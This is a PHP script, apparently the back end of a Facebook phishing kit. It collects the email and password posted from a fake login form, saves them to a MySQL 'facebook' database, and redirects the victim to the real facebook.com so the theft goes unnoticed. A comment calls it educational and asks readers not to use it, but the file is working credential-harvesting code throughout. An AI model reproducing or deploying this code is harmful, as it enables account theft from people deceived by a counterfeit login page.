<?php
  /*
    *Important Notice : This project is for knowledge purpose that how hackers do phissing attacks.
                        Please don't try this to someone.
    Database Structure
    Database Name : facebook
    Tabel Name    : details
    ****************************************************
    * S.N * email                    * password        *
    *   1 * user@example.com         * thisisapassword *
    *   2 * someone@example.com      * thisisapassword *
    ****************************************************
  */
  // Connecting to database
  try {
    $db = new PDO('mysql:host=localhost;dbname=facebook', 'root', '');
  } catch (Exception $e) {
    echo 'Unable to connect with database ' .$e->getMessage();
    exit;
  }

  // Getting user informations and filtering inputs to prevent from sql injections
  $email = filter_input(INPUT_POST, 'email', FILTER_SANITIZE_EMAIL);
  $pass  = filter_input(INPUT_POST, 'pass', FILTER_SANITIZE_STRING);

  // Inserting email and passoword to database
  try {
    $result = $db->prepare('INSERT INTO details(email, password)
      VALUES (?, ?)
    ');
    $result->bindParam(1, $email, PDO::PARAM_STR);
    $result->bindParam(2, $pass, PDO::PARAM_STR);
    $result->execute();
  } catch (Exception $e) {
    echo 'Unable to perform query ' .$e->getMessage();
    exit;
  }

  // Redirecting to facebook.com
  header('location: https://www.facebook.com');
?>
